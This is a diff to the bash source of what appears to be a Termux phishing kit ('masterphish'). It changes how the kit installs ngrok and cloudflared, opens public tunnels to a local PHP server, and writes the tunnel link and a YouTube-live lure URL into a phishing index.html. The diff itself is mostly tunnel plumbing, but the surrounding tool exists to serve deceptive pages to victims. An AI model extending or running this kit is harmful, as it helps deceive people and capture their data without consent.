@@ -167,37 +167,40 @@ select_template() {
 
 
 ngrok_server() {
-#!/bin/bash
+    if command -v ngrok &> /dev/null; then
+        echo ""
+    else
+        echo "Installing Ngrok..."
+        pkg install -y wget unzip
+        wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip -O ngrok.zip
+        unzip ngrok.zip
+        mv ngrok $PREFIX/bin/
+        rm ngrok.zip
+        echo "Ngrok installation complete."
+    fi
 
-# Check if ngrok is already installed
-if command -v ngrok &> /dev/null
-then
-    echo "Ngrok is already installed."
-else
-    echo "Installing Ngrok..."
-    pkg install -y wget unzip
-    wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip -O ngrok.zip
-    unzip ngrok.zip
-    mv ngrok $PREFIX/bin/
-    rm ngrok.zip
+    # Check if Ngrok token is already set
+    if [[ -f "$HOME/.config/ngrok/ngrok.yml" ]] && grep -q "authtoken" "$HOME/.config/ngrok/ngrok.yml"; then
+        echo "Ngrok Authtoken already set."
+    else
+        read -p $'\e[1;92m[+] Enter Ngrok Authtoken: \e[0m' ngrok_auth
+        ngrok config add-authtoken $ngrok_auth
+    fi
 
-    echo "Ngrok installation complete."
-fi
+    fuser -k 3333/tcp > /dev/null 2>&1
+    php -S localhost:3333 > /dev/null 2>&1 &
+    ngrok tcp 3333 > /dev/null 2>&1 &
 
-read -p $'\e[1;92m[+] Enter Ngrok Authtoken: \e[0m' ngrok_auth
-ngrok authtoken $ngrok_auth
-php -S 127.0.0.1:3333 > /dev/null 2>&1 &
-ngrok http 3333 > /dev/null 2>&1 &
+    sleep 10
+    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
 
-sleep 10
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
-
-if [[ -z "$link" ]]; then
-    printf "\e[1;31m[!] Ngrok Tunnel Failed, Check Your Internet!\e[0m\n"
-    exit 1
-else
-    printf "\e[1;92m[+] Ngrok Link:\e[0m \e[1;77m%s\e[0m\n" $link
-fi
+    if [[ -z "$link" ]]; then
+        printf "\e[1;31m[!] Ngrok Tunnel Failed, Check Your Internet!\e[0m\n"
+        exit 1
+    else
+        printf "\e[1;92m[+] Ngrok Link:\e[0m \e[1;77m%s\e[0m\n" $link
+    fi
+    
 Ngrok
 checkfound
 }
@@ -205,12 +208,9 @@ checkfound
 cloudflare_tunnel() {
 rm -f cf_tunnel.log
 
-#!/bin/bash
-
-# Check if Cloudflared is already installed
 if command -v cloudflared &> /dev/null
 then
-    echo "Cloudflared is already installed."
+    echo ""
 else
     echo "Installing Cloudflared..."
     pkg update -y
@@ -246,7 +246,7 @@ masterphish() {
     printf "\n\e[1;92m[\e[1;96m00\e[1;92m]\e[0m\e[1;93m Localhost\e[0m\n"
     printf "\e[1;92m[\e[1;96m01\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
     printf "\e[1;92m[\e[1;96m02\e[1;92m]\e[0m\e[1;93m Server SSH\e[0m\n"
-    printf "\e[1;92m[\e[1;96m03\e[1;92m]\e[0m\e[1;93m Cloudflare Tunnel\e[0m\n"
+    printf "\e[1;92m[\e[1;96m03\e[1;92m]\e[0m\e[1;93m Cloudflare \e[0m\n"
 
     default_option_server="1"
     read -p $'\n\e[1;92m[+] Choose a Port Forwarding option:\e[1;93m[Default is 1] \e[0m' option_server
@@ -276,7 +276,6 @@ masterphish() {
 
 localhost_server() {
 
-# ইউজারকে পোর্ট ইনপুট দিতে বলা হচ্ছে (ডিফল্ট 8080)
 read -p $'\n\e[1;92m[+] Enter Port for\e[1;93m [Default: 8080]: \e[0m' user_port
 user_port="${user_port:-8080}"
 
@@ -316,7 +315,7 @@ sed 's+forwarding_link+'$link'+g' Xindex.html > index3.html
 sed 's+live_yt_tv+'$yt_video_url'+g' index3.html > index.html
 fi
 rm -rf index3.html
-
+checkfound
 }
 
 cl_server() {
@@ -334,7 +333,7 @@ sed 's+forwarding_link+'$link'+g' Xindex.html > index3.html
 sed 's+live_yt_tv+'$yt_video_url'+g' index3.html > index.html
 fi
 rm -rf index3.html
-
+checkfound
 }
 
 banner
